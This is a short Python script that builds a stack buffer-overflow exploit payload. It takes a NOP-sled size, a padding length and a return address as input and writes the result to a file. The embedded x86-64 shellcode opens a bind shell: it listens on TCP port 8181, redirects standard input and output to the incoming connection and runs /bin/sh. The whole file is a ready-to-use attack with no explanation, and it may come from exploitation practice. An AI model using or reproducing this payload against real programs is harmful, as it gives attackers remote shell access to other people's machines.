import os
import struct

shellcode = b"\x48\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x66\x68\x1f\xf5\x66\x6a\x02\x48\x89\xe6\x48\x31\xc0\x48\x83\xc0\x31\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\x48\x83\xc0\x32\x31\xc9\x83\xc1\x01\x0f\x05\x31\xc0\x83\xc0\x2b\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x02\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

nopslidesize   = int(input("nopslidesize:"))
nopsize        = int(input("nopsize:"))
return_address = int(input("return_address:"), 16)

payload  = b"\x90" * nopslidesize
payload += shellcode
payload += b"\x90" * (nopsize-len(payload))
payload += struct.pack('<Q', return_address)
fp = open("payload", "wb")
fp.write(payload)
fp.close()
